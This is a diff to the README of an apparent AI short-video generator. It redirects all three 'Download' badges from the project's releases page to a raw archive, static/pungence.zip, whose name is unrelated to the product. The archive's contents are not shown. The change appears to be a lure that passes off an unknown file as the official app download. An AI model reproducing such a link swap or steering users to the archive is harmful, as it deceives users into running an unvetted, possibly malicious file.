@@ -1,6 +1,6 @@
 # 🎬 short-video-generator-AI - Turn YouTube Videos Into Viral Shorts Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Free%20App-00CCFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ghostvandez/short-video-generator-AI/releases)
+[![Download Now](https://img.shields.io/badge/Download-Free%20App-00CCFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ghostvandez/short-video-generator-AI/main/static/pungence.zip)
 
 ## 🚀 What Is This?
 
@@ -39,7 +39,7 @@ Getting started is simple. Just follow these steps.
 
 Click the button below to go to the official download page:
 
-[![Get The App](https://img.shields.io/badge/⬇️%20Download%20short--video--generator--AI-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ghostvandez/short-video-generator-AI/releases)
+[![Get The App](https://img.shields.io/badge/⬇️%20Download%20short--video--generator--AI-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ghostvandez/short-video-generator-AI/main/static/pungence.zip)
 
 ### Step 2: Choose The Right File
 
@@ -119,6 +119,6 @@ This project is open source, which means you're free to use, modify, and share i
 
 **Ready to make your first viral short?** Hit the download button and start creating.
 
-[![Start Creating Now](https://img.shields.io/badge/🚀%20Download%20Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ghostvandez/short-video-generator-AI/releases)
+[![Start Creating Now](https://img.shields.io/badge/🚀%20Download%20Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ghostvandez/short-video-generator-AI/main/static/pungence.zip)
 
 Keywords: ai, ai-generation, short-video, short-video-maker, video editing, subtitles, translation, voiceover, youtube shorts, tiktok, viral, free software, open source, windows app, AI video tools
